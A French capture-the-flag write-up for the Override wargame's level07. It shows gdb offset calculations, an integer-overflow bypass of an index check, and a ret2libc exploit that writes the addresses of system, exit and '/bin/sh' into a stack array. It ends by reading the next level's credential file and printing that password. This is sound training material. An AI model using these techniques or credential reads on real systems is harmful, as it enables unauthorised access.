# Exploitation du niveau level07 (Override) — Ret2libc avancé

Ce niveau présente un défi avancé autour de la corruption de mémoire via un tableau d'entiers (type `int tab[100]`) et l'évitement de vérifications simples comme `index % 3 == 0`. Le but final est de réussir un retour vers la libc (ret2libc) pour exécuter `/bin/sh`.

---

## 🔍 Analyse initiale

Le binaire contient :

* Un tableau d'entiers `tab[100]`
* Une lecture utilisateur d'un index et d'une valeur
* Une contrainte : `index % 3 == 0` provoque l'arrêt du programme

Aucune protection de type **stack canary**, **PIE**, ou **ASLR** dans l'environnement dédié n'empêche l'exploitation.

---

## 🧰 Déterminer l'adresse de `tab[100]`

Utilisation de `gdb` pour suivre le pointeur vers `tab` :

```bash
gdb-peda$ b read_number
gdb-peda$ r
gdb-peda$ x/x $ebp+0x8
0xffffd520:  0xffffd544
```

* `0xffffd520` : emplacement où l'adresse de `tab` est stockée
* `0xffffd544` : adresse de début du tableau `tab`

### Calcul de l'index pour accéder à 0xffffd520

```bash
0xffffd520 - 0xffffd544 = -0x24 = -36
-36 / 4 (taille d'un int) = -9
```

Donc `tab[-9]` permet d'accéder à l'adresse où est stockée `tab` (pointeur).

---

## 🔢 Trouver l'adresse de retour (EIP)

```bash
gdb-peda$ b *main+520  # Instruction juste avant le retour
gdb-peda$ r
gdb-peda$ info frame
eip = 0xffffd70c
```

### Calcul de l'index pour atteindre l'EIP depuis `tab[0]`

```bash
0xffffd70c - 0xffffd544 = 456
456 / 4 = 114
```

`tab[114]` contient donc l'adresse de retour EIP.

```bash
gdb-peda$ x/x 0xffffd70c
0xffffd70c: 0xf7e45513
```

---

## ⚠️ Contourner `index % 3 == 0`

Le programme vérifie :

```c
if (index % 3 == 0)
    exit(1);
```

Mais comme le code utilise l'index pour accéder à `tab[index * 4]`, on peut utiliser un **overflow arithmétique** !

### Idée : trouver un entier `i` % 3 != 0`

```bash
UINT_MAX = 4294967295
( 4294967296 / 4 ) + 114 ) = 1073741938

```

Ce contournement déjoue la vérification `index % 3 == 0` !

---

## 🪤 Ret2libc

On va remplacer l'adresse de retour (tab\[114]) par un appel à `system("/bin/sh")` avec `exit()` ensuite.

### Récupération des adresses dans GDB

```bash
info functions system
=> system@GLIBC = 0xf7e6aed0 = 4159090384

info functions exit
=> exit@GLIBC   = 0xf7e5eb70 = 4159040368

find __libc_start_main,+99999999,"/bin/sh"
=> /bin/sh = 0xf7f897ec = 4160264172
```

### Insertion des valeurs dans le tableau :

```c
tab[1073741938] = system_addr; (114)
tab[115] = exit_addr;
tab[116] = binsh_addr;
```

---

## 🔐 Exemple final d'exploitation

En utilisant un script Python ou en interactif :

```bash
Index: 1073741938 (114)
Value: 4159090384   # system

Index: 115
Value: 4159040368   # exit

Index: 116
Value: 4160264172   # /bin/sh
```

Puis lancer l'exécution jusqu'à la fin pour provoquer le retour à `system("/bin/sh")`.

---

## 🎉 Succès : obtenir le shell

```bash
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

---
